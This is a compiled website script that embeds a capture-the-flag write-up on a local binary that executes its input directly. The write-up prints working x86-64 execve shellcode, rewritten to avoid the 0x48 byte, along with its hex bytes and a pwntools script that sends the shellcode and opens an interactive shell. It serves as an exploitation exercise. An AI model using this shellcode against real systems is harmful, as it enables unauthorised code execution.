"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[6421],{3905:(e,n,t)=>{t.d(n,{Zo:()=>x,kt:()=>h});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function l(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?l(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)t=l[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)t=l[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var i=r.createContext({}),p=function(e){var n=r.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},x=function(e){var n=p(e.components);return r.createElement(i.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},c=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,l=e.originalType,i=e.parentName,x=s(e,["components","mdxType","originalType","parentName"]),c=p(t),h=a,d=c["".concat(i,".").concat(h)]||c[h]||u[h]||l;return t?r.createElement(d,o(o({ref:n},x),{},{components:t})):r.createElement(d,o({ref:n},x))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var l=t.length,o=new Array(l);o[0]=c;var s={};for(var i in n)hasOwnProperty.call(n,i)&&(s[i]=n[i]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var p=2;p<l;p++)o[p]=t[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}c.displayName="MDXCreateElement"},4003:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>u,frontMatter:()=>l,metadata:()=>s,toc:()=>p});var r=t(7462),a=(t(7294),t(3905));const l={slug:"level-1",title:"Level 1",authors:["nguyen"],tags:["Binary Exploitation"]},o=void 0,s={permalink:"/blog/level-1",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-01-level-1.md",source:"@site/blog/2022-05-01-level-1.md",title:"Level 1",description:"Level 1",date:"2022-05-01T00:00:00.000Z",formattedDate:"May 1, 2022",tags:[{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:2.955,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"level-1",title:"Level 1",authors:["nguyen"],tags:["Binary Exploitation"]},prevItem:{title:"Got Hax",permalink:"/blog/got_hax"},nextItem:{title:"Are you root?",permalink:"/blog/are-you-root"}},i={authorsImageUrls:[void 0]},p=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2},{value:"The Solve",id:"the-solve",level:2},{value:"References",id:"references",level:2}],x={toc:p};function u(e){let{components:n,...l}=e;return(0,a.kt)("wrapper",(0,r.Z)({},x,l,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"Level 1"),(0,a.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,a.kt)("p",null,"File can be downloaded ",(0,a.kt)("a",{parentName:"p",href:"/files/level_1/level-1"},"here")," (Right click and open in new tab)."),(0,a.kt)("p",null,"The goal of this challenge is to provide shellcode that gets executed for a shell."),(0,a.kt)("h2",{id:"analysis"},"Analysis"),(0,a.kt)("p",null,"I ran the executable and sent random output just to see what would happen. When I sent 'h', I received an output ",(0,a.kt)("inlineCode",{parentName:"p"},"Illegal instruction (core dumped)"),". Since it interpreted 'h' as an instruction, I could try to feed it an input that would be a valid instruction."),(0,a.kt)("p",null,"Using ghidra, I looked in main and found that the executable reads into a buffer of 4096 bytes and then executes it directly in memory. The value ",(0,a.kt)("inlineCode",{parentName:"p"},"0x48")," is treated as a bad byte so I had to create shellcode that would avoid ",(0,a.kt)("inlineCode",{parentName:"p"},"0x48")," and null bytes."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"0x48")," is a REX prefix that generally appears in shellcode where certain operations performed on 64 bit registers are used. I used the shellcode from pwntools as a template to start with."),(0,a.kt)("h2",{id:"the-solve"},"The Solve"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python3"},"shellcode = asm(shellcraft.amd64.linux.sh())\n")),(0,a.kt)("p",null,"The above code provides the following shellcode:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-asm"},"/* execve(path='/bin///sh', argv=['sh'], envp=0) */\n/* push b'/bin///sh\\x00' */\npush 0x68\nmov rax, 0x732f2f2f6e69622f\npush rax\nmov rdi, rsp\n/* push argument array ['sh\\x00'] */\n/* push b'sh\\x00' */\npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi /* 0 */\npush rsi /* null terminate */\npush 8\npop rsi\nadd rsi, rsp\npush rsi /* 'sh\\x00' */\nmov rsi, rsp\nxor edx, edx /* 0 */\n/* call execve() */\npush SYS_execve /* 0x3b */\npop rax\nsyscall\n")),(0,a.kt)("p",null,"Throwing it into an assembler reveals that there are a few ",(0,a.kt)("inlineCode",{parentName:"p"},"0x48")," bytes that need to be replaced."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-asm"},"0:  6a 68                   push   0x68\n2:  48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f\n9:  2f 2f 73\nc:  50                      push   rax\nd:  48 89 e7                mov    rdi,rsp\n10: 68 72 69 01 01          push   0x1016972\n15: 81 34 24 01 01 01 01    xor    DWORD PTR [rsp],0x1010101\n1c: 31 f6                   xor    esi,esi\n1e: 56                      push   rsi\n1f: 6a 08                   push   0x8\n21: 5e                      pop    rsi\n22: 48 01 e6                add    rsi,rsp\n25: 56                      push   rsi\n26: 48 89 e6                mov    rsi,rsp\n29: 31 d2                   xor    edx,edx\n2b: ff 34 25 00 00 00 00    push   QWORD PTR ds:0x0\n32: 58                      pop    rax\n33: 0f 05                   syscall\n")),(0,a.kt)("p",null,"I replaced mov operations with pushes and pops in order to get rid of the bad bytes. I also replaced line 2b with ",(0,a.kt)("inlineCode",{parentName:"p"},"push 0x3b")," for the syscall code for execve."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-asm"},"push 0x68\nmov r15, 0x732f2f2f6e69622f\npush r15\npush rsp\npop rdi\n\npush 0x1010101 ^ 0x6873\nxor dword ptr [rsp], 0x1010101\nxor esi, esi\npush rsi\npush 8\npop r14\nadd r14, rsp\npush r14\npush rsp\npop rsi\nxor edx, edx\npush 0x3b\npop rax\nsyscall\n")),(0,a.kt)("p",null,"Now there are no more bad bytes."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},'"\\x6A\\x68\\x49\\xBF\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x2F\\x73\\x41\\x57\\x54\\x5F\\x68\\x72\\x69\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x31\\xF6\\x56\\x6A\\x08\\x41\\x5E\\x49\\x01\\xE6\\x41\\x56\\x54\\x5E\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05"')),(0,a.kt)("p",null,"I use pwntools to send the payload to the program and successfully obtain a shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python3\n\n\"\"\"\nToast's submission for the challenge level-1.\n\nThis script can be used in the following manner:\npython3 ./solve.py\n\nReturns:\n    An interactive shell\n\"\"\"\n\nfrom pwn import *\n\nexe = ELF(\"./level-1\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\ncontext.arch = 'amd64'\n\ndef conn():\n    '''Establish the connection to the process, local or remote.\n    '''\n\n    io = process([exe.path])\n    return io\n\n\ndef main():\n    '''Return the flag.\n    '''\n\n    with conn() as io:\n        shellcode = b\"\\x6A\\x68\\x49\\xBF\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x2F\\x73\" + \\\n                    b\"\\x41\\x57\\x54\\x5F\\x68\\x72\\x69\\x01\\x01\\x81\\x34\\x24\" + \\\n                    b\"\\x01\\x01\\x01\\x01\\x31\\xF6\\x56\\x6A\\x08\\x41\\x5E\\x49\" + \\\n                    b\"\\x01\\xE6\\x41\\x56\\x54\\x5E\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05\"\n        io.send(shellcode)\n        io.interactive()\n\n\nif __name__ == '__main__':\n    main()\n")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Shell output",src:t(4581).Z,width:"411",height:"254"})),(0,a.kt)("h2",{id:"references"},"References"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://defuse.ca/online-x86-assembler.htm#disassembly"},"https://defuse.ca/online-x86-assembler.htm#disassembly")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://staffwww.fullcoll.edu/aclifton/cs241/lecture-instruction-format.html"},"https://staffwww.fullcoll.edu/aclifton/cs241/lecture-instruction-format.html")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix"},"https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix")))}u.isMDXComponent=!0},4581:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/shell-59983f23967b0db4382a117934f1d92e.png"}}]);